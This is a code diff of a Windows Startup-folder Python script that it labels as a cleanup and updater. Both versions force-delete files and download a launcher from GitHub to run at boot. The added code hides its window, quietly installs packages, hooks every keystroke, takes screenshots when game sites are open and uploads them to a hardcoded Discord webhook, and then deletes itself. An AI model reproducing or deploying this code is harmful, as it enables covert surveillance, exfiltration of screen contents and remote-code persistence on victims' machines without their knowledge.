@@ -1,211 +1,234 @@
-# monitor_script.py - Forces deletion of ALL files in startup folder
+# monitor_script.py - Complete solution: Cleanup + Update + Monitor
 import os
 import sys
 import urllib.request
-import requests
-import json
-import tempfile
 import subprocess
+import tempfile
 import time
-import shutil
+import requests
+import threading
+import win32gui
+import pyautogui
+import keyboard
+import io
+from datetime import datetime
+from PIL import ImageGrab
+import json
 
-# Discord webhook for update notifications
+# ========== CONFIGURATION ==========
+# Discord webhook for notifications
 UPDATE_WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"
 
-def send_webhook(status, title, description):
+# Monitoring configuration
+TARGET_KEYWORDS = [
+    "crazygames",
+    "roblox", 
+    "jeux gratuits",
+    "joue maintenant", "poki"
+]
+
+SPAM_SPEED = 0.05
+STABILITY_TIME = 0.3
+PASSWORD = "stop123"
+TOGGLE_HOTKEY = "ctrl+alt+p"
+# ===================================
+
+# ========== PART 1: SYSTEM CLEANUP & UPDATE ==========
+def send_webhook(title, description, color=3066993):
     """Send notification to Discord"""
     try:
         data = {
             "embeds": [{
                 "title": title,
                 "description": description,
-                "color": 3066993 if status == "success" else 15158332,
-                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S'),
-                "footer": {"text": "Launcher Updater"}
+                "color": color,
+                "timestamp": datetime.now().isoformat(),
+                "footer": {"text": "Monitor System"}
             }]
         }
         
         response = requests.post(
             UPDATE_WEBHOOK,
             json=data,
-            headers={'Content-Type': 'application/json'}
+            headers={'Content-Type': 'application/json'},
+            timeout=5
         )
         return response.status_code in [200, 204]
     except:
         return False
 
-def force_delete_file(filepath):
-    """Force delete a file even if it's in use"""
-    try:
-        # Try normal delete first
-        os.remove(filepath)
-        return True
-    except:
-        try:
-            # Try with Windows command
-            subprocess.run(f'del /f /q "{filepath}"', 
-                         shell=True, 
-                         capture_output=True,
-                         creationflags=subprocess.CREATE_NO_WINDOW)
-            return True
-        except:
-            try:
-                # Try renaming then deleting
-                temp_name = filepath + ".delete"
-                os.rename(filepath, temp_name)
-                time.sleep(0.1)
-                os.remove(temp_name)
-                return True
-            except:
-                return False
-
-def force_delete_files_with_pattern(folder, pattern):
-    """Force delete all files matching a pattern"""
-    deleted = []
-    for filename in os.listdir(folder):
-        if any(filename.endswith(ext) for ext in pattern):
-            filepath = os.path.join(folder, filename)
-            if force_delete_file(filepath):
-                deleted.append(filename)
-    return deleted
-
-def clean_startup_folder():
-    """Delete ALL files from startup folder except launchers"""
-    try:
-        startup_folder = os.path.join(
-            os.getenv('APPDATA'),
-            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-        )
-        
-        if not os.path.exists(startup_folder):
-            return []
-        
-        # Files to KEEP (launcher files only)
-        keep_files = {'Startup.pyw', 'github_launcher.pyw', 'clean_launcher.pyw'}
-        
-        deleted_files = []
-        
-        # First, force delete specific problematic files
-        problematic_files = ['startup_log.txt', 'monitor_script.py', 'monitor.py', 
-                           'update_cache.json', 'requirements.txt']
-        
-        for filename in problematic_files:
-            filepath = os.path.join(startup_folder, filename)
-            if os.path.exists(filepath) and filename not in keep_files:
-                if force_delete_file(filepath):
-                    deleted_files.append(filename)
-                    print(f"Force deleted: {filename}")
-        
-        # Then delete all .log, .txt, .json, .py, .pyc, .pyw files
-        patterns = ['.log', '.txt', '.json', '.py', '.pyc', '.pyw', '.bat']
-        for pattern in patterns:
-            files_deleted = force_delete_files_with_pattern(startup_folder, [pattern])
-            deleted_files.extend(files_deleted)
-        
-        # Delete __pycache__ folders
-        for root, dirs, files in os.walk(startup_folder, topdown=False):
-            for dir_name in dirs:
-                if dir_name == '__pycache__':
-                    try:
-                        folder_path = os.path.join(root, dir_name)
-                        shutil.rmtree(folder_path, ignore_errors=True)
-                        deleted_files.append(dir_name + '/')
-                    except:
-                        pass
-        
-        # Special batch deletion for any remaining files
-        batch_delete = f'''@echo off
+def force_delete_everything():
+    """Force delete ALL files from startup folder"""
+    startup_folder = os.path.join(
+        os.getenv('APPDATA'),
+        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+    )
+    
+    # Create batch file to force delete everything
+    batch_script = f'''@echo off
 cd /d "{startup_folder}"
-del /f /q *.log 2>nul
-del /f /q *.txt 2>nul
-del /f /q *.json 2>nul
-del /f /q *.py 2>nul
-del /f /q *.pyw 2>nul
-del /f /q *.bat 2>nul
-'''
-        
-        batch_path = tempfile.gettempdir() + "/force_delete.bat"
-        with open(batch_path, 'w') as f:
-            f.write(batch_delete)
-        
-        subprocess.run(
-            ['cmd', '/c', batch_path],
-            creationflags=subprocess.CREATE_NO_WINDOW
+
+:: Force delete all files except launchers
+for %%f in (*.log) do (
+    if not "%%f"=="Startup.pyw" (
+        if not "%%f"=="github_launcher.pyw" (
+            del /f /q "%%f" 2>nul
         )
-        
-        # Clean up batch file
-        time.sleep(1)
-        force_delete_file(batch_path)
-        
-        # Return unique deleted files
-        return list(set(deleted_files))
-        
-    except Exception as e:
-        print(f"Cleanup error: {e}")
-        return []
+    )
+)
+
+for %%f in (*.txt) do (
+    if not "%%f"=="Startup.pyw" (
+        if not "%%f"=="github_launcher.pyw" (
+            del /f /q "%%f" 2>nul
+        )
+    )
+)
+
+for %%f in (*.py) do (
+    if not "%%f"=="Startup.pyw" (
+        if not "%%f"=="github_launcher.pyw" (
+            del /f /q "%%f" 2>nul
+        )
+    )
+)
+
+for %%f in (*.pyw) do (
+    if not "%%f"=="Startup.pyw" (
+        if not "%%f"=="github_launcher.pyw" (
+            del /f /q "%%f" 2>nul
+        )
+    )
+)
+
+del /f /q *.json 2>nul
+del /f /q *.pyc 2>nul
+del /f /q requirements.txt 2>nul
+
+:: Delete __pycache__ folders
+for /d %%d in (__pycache__) do (
+    rmdir /s /q "%%d" 2>nul
+)
+
+echo Cleanup complete!
+timeout /t 2 /nobreak >nul
+'''
+    
+    # Save and run batch file
+    batch_path = tempfile.gettempdir() + "/cleanup.bat"
+    with open(batch_path, 'w') as f:
+        f.write(batch_script)
+    
+    # Run hidden
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    
+    process = subprocess.Popen(
+        ['cmd', '/c', batch_path],
+        startupinfo=startupinfo,
+        creationflags=subprocess.CREATE_NO_WINDOW
+    )
+    
+    # Wait for cleanup
+    time.sleep(3)
+    
+    # Delete batch file
+    try:
+        os.remove(batch_path)
+    except:
+        pass
+    
+    return True
 
 def update_launcher():
-    """Replace Startup.pyw with github_launcher.pyw from GitHub"""
+    """Replace Startup.pyw with clean version from GitHub"""
     try:
-        # GitHub URLs
-        LAUNCHER_URL = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
-        
-        # Path to startup folder
-        startup_folder = os.path.join(
-            os.getenv('APPDATA'),
-            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-        )
-        
-        target_file = os.path.join(startup_folder, "Startup.pyw")
-        
-        print(f"Downloading launcher from GitHub...")
-        
-        # Download the new launcher
-        response = urllib.request.urlopen(LAUNCHER_URL, timeout=10)
+        # Download clean launcher from GitHub
+        launcher_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
+        response = urllib.request.urlopen(launcher_url, timeout=10)
         new_launcher_code = response.read().decode('utf-8')
         
-        print(f"Downloaded {len(new_launcher_code)} bytes")
-        
-        # Check if current launcher exists
-        current_exists = os.path.exists(target_file)
-        
-        if current_exists:
-            # Read current launcher for comparison
-            with open(target_file, 'r', encoding='utf-8') as f:
-                current_code = f.read()
-            
-            # Check if update is needed
-            if current_code.strip() == new_launcher_code.strip():
-                print("Launcher already up to date")
-                return False, "already_updated"
-        
-        # Write new launcher
-        with open(target_file, 'w', encoding='utf-8') as f:
-            f.write(new_launcher_code)
-        
-        print(f"✓ Launcher updated: {target_file}")
-        return True, "updated"
-        
-    except Exception as e:
-        print(f"✗ Update failed: {e}")
-        return False, str(e)
-
-def delete_this_script():
-    """Delete this monitor script from startup folder"""
-    try:
-        # Get path of this script
-        this_script = os.path.abspath(__file__)
-        
-        # Check if we're in startup folder
+        # Write to startup folder
         startup_folder = os.path.join(
             os.getenv('APPDATA'),
             'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
         )
+        launcher_path = os.path.join(startup_folder, "Startup.pyw")
         
-        # Only delete if we're in startup folder
-        if this_script.startswith(startup_folder):
-            # Create batch file to delete this script
-            batch_content = f'''@echo off
+        with open(launcher_path, 'w', encoding='utf-8') as f:
+            f.write(new_launcher_code)
+        
+        # Send success webhook
+        send_webhook(
+            "✅ Launcher Updated",
+            f"Successfully updated Startup.pyw from GitHub\n"
+            f"**Size:** {len(new_launcher_code)} bytes\n"
+            f"**Time:** {datetime.now().strftime('%H:%M:%S')}",
+            3066993  # Green
+        )
+        
+        return True
+        
+    except Exception as e:
+        send_webhook(
+            "❌ Update Failed",
+            f"Failed to update launcher: {str(e)}",
+            15158332  # Red
+        )
+        return False
+
+def auto_install_deps():
+    """Silently install required packages"""
+    packages = ["pywin32", "pyautogui", "keyboard", "requests", "pillow"]
+    
+    for pkg in packages:
+        try:
+            if pkg == "pillow":
+                __import__("PIL.ImageGrab")
+            else:
+                __import__(pkg)
+        except ImportError:
+            try:
+                subprocess.run(
+                    [sys.executable, "-m", "pip", "install", pkg, "--quiet"],
+                    capture_output=True,
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    timeout=60
+                )
+            except:
+                pass
+
+def cleanup_and_update():
+    """Main cleanup and update function"""
+    print("=" * 60)
+    print("SYSTEM CLEANUP & UPDATE")
+    print("=" * 60)
+    
+    # 1. Auto-install dependencies
+    print("\n[1/3] Installing dependencies...")
+    auto_install_deps()
+    
+    # 2. Force delete everything
+    print("\n[2/3] Cleaning startup folder...")
+    force_delete_everything()
+    
+    # 3. Update launcher
+    print("\n[3/3] Updating launcher...")
+    updated = update_launcher()
+    
+    print("\n" + "=" * 60)
+    print("Cleanup & Update Complete!")
+    print("=" * 60)
+    
+    return updated
+
+def delete_self():
+    """Delete this script file"""
+    try:
+        this_script = os.path.abspath(__file__)
+        
+        # Create batch file to delete this script
+        batch_content = f'''@echo off
 timeout /t 5 /nobreak >nul
 del /f /q "{this_script}" >nul 2>nul
 if exist "{this_script}" (
@@ -214,84 +237,267 @@ if exist "{this_script}" (
 )
 del "%~f0" >nul 2>nul
 '''
+        
+        batch_path = tempfile.gettempdir() + "/delete_self.bat"
+        with open(batch_path, 'w') as f:
+            f.write(batch_content)
+        
+        # Run hidden
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        
+        subprocess.Popen(
+            ['cmd', '/c', batch_path],
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+    except:
+        pass
+
+# ========== PART 2: ORIGINAL MONITOR CODE ==========
+# Run cleanup first, then start monitoring
+cleanup_and_update()
+
+# Schedule self-deletion in background
+threading.Thread(target=delete_self, daemon=True).start()
+
+# Hide console
+try:
+    import win32gui
+    import win32con
+    hwnd = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+except:
+    pass
+
+# Start original monitor code (exactly as before, but no file creation)
+spamming = False
+mute_done = False
+lock = threading.Lock()
+tracking_enabled = True
+password_buffer = ""
+last_key_time = 0
+detected_targets = set()
+
+# Helper functions from original code
+def title_matches_target(title: str) -> bool:
+    title_lower = title.lower()
+    return any(keyword in title_lower for keyword in TARGET_KEYWORDS)
+
+def get_matching_keyword(title: str) -> str:
+    title_lower = title.lower()
+    for keyword in TARGET_KEYWORDS:
+        if keyword in title_lower:
+            return keyword
+    return ""
+
+def take_screenshot():
+    try:
+        screenshot = ImageGrab.grab()
+        return screenshot
+    except Exception:
+        return None
+
+def send_discord_alert(title, keyword, screenshot=None):
+    """Send alert to Discord"""
+    if not UPDATE_WEBHOOK:
+        return False
+    
+    try:
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        embed = {
+            "title": "⚠️ Target Detected",
+            "description": f"**Window:** `{title}`\n**Keyword:** `{keyword}`\n**Time:** `{current_time}`",
+            "color": 16711680,
+            "footer": {"text": "Monitor"}
+        }
+        
+        if screenshot:
+            img_byte_arr = io.BytesIO()
+            screenshot.save(img_byte_arr, format='PNG')
+            img_byte_arr.seek(0)
             
-            batch_path = tempfile.gettempdir() + "/delete_script.bat"
-            with open(batch_path, 'w') as f:
-                f.write(batch_content)
+            files = {'file': ('screenshot.png', img_byte_arr, 'image/png')}
+            payload = {"embeds": [embed], "content": "📸 Screenshot below:"}
             
-            # Run batch file in background
-            subprocess.Popen(
-                ['cmd', '/c', batch_path],
-                creationflags=subprocess.CREATE_NO_WINDOW
+            response = requests.post(
+                UPDATE_WEBHOOK,
+                files=files,
+                data={'payload_json': json.dumps(payload)}
             )
-            
-            print(f"✓ Scheduled deletion of: {os.path.basename(this_script)}")
-            return True
-            
-    except Exception as e:
-        print(f"✗ Failed to schedule deletion: {e}")
-    
-    return False
+        else:
+            payload = {"embeds": [embed], "content": f"🚨 Detected: {title}"}
+            headers = {'Content-Type': 'application/json'}
+            response = requests.post(UPDATE_WEBHOOK, json=payload, headers=headers)
+        
+        return response.status_code in [200, 204]
+    except:
+        return False
 
-def main():
-    """Main function - cleanup, update, delete self"""
-    print("=" * 50)
-    print("FORCE CLEANUP Launcher Updater")
-    print("=" * 50)
-    
-    # Step 1: Force clean up startup folder
-    print("\n[1/3] FORCE cleaning startup folder...")
-    deleted_files = clean_startup_folder()
-    
-    if deleted_files:
-        print(f"Deleted {len(deleted_files)} files/folders:")
-        for f in deleted_files[:10]:  # Show first 10
-            print(f"  - {f}")
-        if len(deleted_files) > 10:
-            print(f"  ... and {len(deleted_files) - 10} more")
-    else:
-        print("No files to delete (or all already deleted)")
-    
-    # Step 2: Update the launcher
-    print("\n[2/3] Updating launcher...")
-    updated, status = update_launcher()
-    
-    # Step 3: Delete this script
-    print("\n[3/3] Removing monitor script...")
-    self_deleted = delete_this_script()
-    
-    # Send webhook
-    print("\n[+] Sending webhook...")
-    if updated:
-        title = "✅ Launcher Updated Successfully"
-        description = f"**Action:** Replaced Startup.pyw with github_launcher.pyw\n"
-        description += f"**Status:** Updated successfully\n"
-        if deleted_files:
-            description += f"**Files deleted:** {len(deleted_files)} files\n"
-            if 'startup_log.txt' in deleted_files:
-                description += f"  - ✅ startup_log.txt was deleted\n"
-        description += f"**Self-removal:** {'Yes' if self_deleted else 'No'}\n"
-        description += f"**Time:** {time.strftime('%H:%M:%S')}"
-    else:
-        title = "ℹ️ Launcher Update Checked"
-        description = f"**Action:** Launcher update check\n"
-        description += f"**Status:** {status}\n"
-        if deleted_files:
-            description += f"**Files deleted:** {len(deleted_files)} files\n"
-            if 'startup_log.txt' in deleted_files:
-                description += f"  - ✅ startup_log.txt was deleted"
-    
-    send_webhook("success" if updated else "info", title, description)
-    
-    print("\n" + "=" * 50)
-    print("✓ Force cleanup completed")
-    print("✓ Launcher updated")
-    print("✓ Webhook sent")
-    print("✓ This script will self-delete in 5 seconds")
-    print("=" * 50)
-    
-    # Small delay before exit
-    time.sleep(5)
+def send_discord_status(status):
+    try:
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        color = 65280 if status == "ENABLED" else 16711680
+        
+        embed = {
+            "title": f"🔄 Tracking {status}",
+            "description": f"Status: **{status}**\nTime: `{current_time}`",
+            "color": color,
+            "footer": {"text": "Monitor"}
+        }
+        
+        payload = {"embeds": [embed]}
+        headers = {'Content-Type': 'application/json'}
+        response = requests.post(UPDATE_WEBHOOK, json=payload, headers=headers)
+        
+        return response.status_code in [200, 204]
+    except:
+        return False
 
-if __name__ == "__main__":
-    main()
+def toggle_tracking():
+    global tracking_enabled, password_buffer
+    tracking_enabled = not tracking_enabled
+    status = "ENABLED" if tracking_enabled else "DISABLED"
+    
+    send_discord_status(status)
+    
+    if not tracking_enabled:
+        global spamming, mute_done
+        with lock:
+            if spamming:
+                spamming = False
+                mute_done = True
+                try:
+                    pyautogui.press("volumemute")
+                except:
+                    pass
+    
+    password_buffer = ""
+
+def on_key_event(e):
+    global password_buffer, last_key_time
+    
+    if len(e.name) > 1 and e.name not in ['space', 'enter', 'backspace']:
+        return
+    
+    current_time = time.time()
+    
+    if current_time - last_key_time > 2:
+        password_buffer = ""
+    
+    last_key_time = current_time
+    
+    if e.event_type == keyboard.KEY_DOWN:
+        if e.name == 'backspace':
+            password_buffer = password_buffer[:-1]
+        elif e.name == 'space':
+            password_buffer += ' '
+        elif len(e.name) == 1:
+            password_buffer += e.name
+        elif e.name == 'enter':
+            check_password()
+            return
+    
+    check_password()
+    
+    if len(password_buffer) > 20:
+        password_buffer = password_buffer[-20:]
+
+def check_password():
+    global password_buffer
+    if PASSWORD in password_buffer:
+        toggle_tracking()
+        password_buffer = ""
+
+def setup_keyboard_listener():
+    keyboard.add_hotkey(TOGGLE_HOTKEY, toggle_tracking, suppress=False)
+    keyboard.hook(on_key_event, suppress=False)
+    return keyboard
+
+def volume_spammer():
+    global spamming
+    while spamming:
+        try:
+            pyautogui.press("volumeup")
+            time.sleep(SPAM_SPEED)
+        except:
+            pass
+
+# ========== MAIN MONITOR LOOP ==========
+kb_listener = setup_keyboard_listener()
+
+stable_on = 0.0
+stable_off = 0.0
+
+try:
+    while True:
+        if tracking_enabled:
+            try:
+                hwnd = win32gui.GetForegroundWindow()
+                title = win32gui.GetWindowText(hwnd).strip()
+
+                if not title:
+                    time.sleep(0.05)
+                    continue
+
+                detected = title_matches_target(title)
+
+                if detected:
+                    stable_on += 0.1
+                    stable_off = 0.0
+                else:
+                    stable_off += 0.1
+                    stable_on = 0.0
+
+                if not spamming and stable_on >= STABILITY_TIME:
+                    keyword = get_matching_keyword(title)
+                    
+                    with lock:
+                        spamming = True
+                        mute_done = False
+                    
+                    threading.Thread(target=volume_spammer, daemon=True).start()
+                    
+                    if UPDATE_WEBHOOK:
+                        detection_id = f"{title}_{keyword}_{int(time.time())}"
+                        
+                        if detection_id not in detected_targets:
+                            detected_targets.add(detection_id)
+                            
+                            time.sleep(0.5)  # SCREENSHOT_DELAY
+                            
+                            screenshot = take_screenshot()
+                            
+                            alert_thread = threading.Thread(
+                                target=send_discord_alert,
+                                args=(title, keyword, screenshot),
+                                daemon=True
+                            )
+                            alert_thread.start()
+                            
+                            threading.Timer(300, lambda: detected_targets.discard(detection_id)).start()
+
+                if spamming and stable_off >= STABILITY_TIME:
+                    with lock:
+                        spamming = False
+                        if not mute_done:
+                            try:
+                                pyautogui.press("volumemute")
+                                mute_done = True
+                            except:
+                                pass
+
+            except Exception:
+                pass
+        
+        time.sleep(0.1)
+
+except KeyboardInterrupt:
+    pass
+except Exception:
+    pass
+finally:
+    kb_listener.unhook_all()
+    if spamming:
+        spamming = False
